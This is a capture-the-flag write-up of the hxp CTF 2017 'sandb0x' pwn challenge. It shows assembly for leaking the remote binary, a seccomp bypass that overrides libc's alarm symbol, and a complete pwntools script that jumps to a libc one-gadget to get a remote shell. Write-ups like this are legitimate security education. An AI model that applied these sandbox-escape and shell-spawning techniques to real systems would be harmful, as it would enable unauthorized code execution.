# Writeup for sandb0x (pwn, 200 + 75 pts, 4 solves), hxp CTF 2017

Description:

> see http://www.gifbin.com/bin/33yusw44837sw.gif
>
> Download: [b2ba438dde0be512af486c0d2f1139a9eda8a607632dc4746dc60f75b2c36121.tar.xz](https://2017.ctf.link/assets/files/b2ba438dde0be512af486c0d2f1139a9eda8a607632dc4746dc60f75b2c36121.tar.xz)
>
> Connection: nc 35.198.105.104 26739

## TL;DR

- we can upload assembly code wich gets executed

- seccomp filters prevent us from using most syscalls

- overwrite libc symbols in the assembly to bypass seccomp

- leak the remote binary and libc

- let the assembly code jump to a magic gadget to get a shell

## The Task

We can input up to 80 characters of x86-64 assembler in AT&T syntax, and the target will compile it together with a `main.c` and execute it on the remote server. We don't know the contents of `main.c`, but it will likely set up a seccomp filter before calling our code, because the binary is linked against libseccomp (`-lseccomp`).

## The Bug

The obvious vulnerability is that we can execute code on the target machine, although only in small chunks of 80 characters. Another vulnerability is that we are able to export symbols from our assembly code to the linker (`.global` is allowed), which allows us to overwrite functions imported from libraries.

## The Exploit

We have no idea of what syscalls the seccomp filter allows or what the contents of `main.c` are, so the first thing to do is leak the remote binary. I used the following code:

```assembly_x86
mov $1,%rax;
mov $1,%rdi;
mov (%rsp),%rsi;
sub $0,%rsi;
mov $9999,%rdx;
syscall
```

Increase the amount subtracted from `rsi` until you hit the ELF header, then increase it to leak the first segment of the binary, which contains all of the code.

Using the same technique, we can leak the second segment of the binary containing the data, bss and GOT. With the GOT, the string table and the references to the GOT from the code, we can resolve the addresses of `_IO_2_1_stdin_`, `_IO_2_1_stdout_` and `_IO_2_1_stderr_` and use [libc.blukat.me](https://libc.blukat.me/) to find 6 versions of libc with matching offsets.

After analyzing the leaked code we see that the seccomp filters only allow `write`, `exit`, `clock_gettime` and `exit_group` syscalls, but we can bypass seccomp easily by exporting our own `alarm` function, which the binary calls instead of libc's `alarm` before setting up seccomp.

At this point, we know the remote libc (we have 6 possibilities, but we will just try them all), and we can execute a small amount of code without syscall restrictions. To finally pop a shell, we hook the `alarm` function, calculate the address of libc's magic gadget, and jump there:

(`r11` contains the address of libc's `setbuf` when `alarm` is called, and `$XX` should be replaced with the offset of the magic gadget from `setbuf`)

```assembly_x86
.global alarm;
alarm:
add $XX,%r11;
jmp %r11
```

Putting everything together, we end up with the following exploit:

```python
from pwn import *

context.arch = 'amd64'

def exe(code):
    code = ''.join(c for c in code if c in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%.,;:()$_- ')

    r = remote('35.198.105.104', 26739)
    r.sendlineafter('x86-64> ', code)
    out = r.recvrepeat(1)

    if r.connected('recv'):
        info("-- GOT SHELL --")
        r.interactive()
    r.close()

    return out

if __name__ == '__main__':

    libcs = [('remote_libc/libc6_2.24-3ubuntu1_amd64.so', 0x455aa),
             ('remote_libc/libc6_2.24-3ubuntu2_amd64.so', 0x455aa),
             ('remote_libc/libc6_2.24-9ubuntu2_amd64.so', 0x4557a),
             ('remote_libc/libc6-amd64_2.24-3ubuntu1_i386.so', 0x3f3ea),
             ('remote_libc/libc6-amd64_2.24-3ubuntu2_i386.so', 0x3f3ea),
             ('remote_libc/libc6-amd64_2.24-9ubuntu2_i386.so', 0x3f3da)]

    for path, magic in libcs:
        e = ELF(path)
        offset = magic - e.symbols['setbuf']
        info("libc: %s, offset: 0x%x" % (path, offset))

        info("%s\n%s" % exe('''
.global alarm;
alarm:
add ${},%r11;
jmp %r11'''.format(offset)))
```

The very last of our libc candidates succeeds and we get a shell.

Flag: `hxp{w3nn_1ch_6r055_b1n_5p13l3_1ch_n1ch7_m3hr_1m_54ndk4573n}`
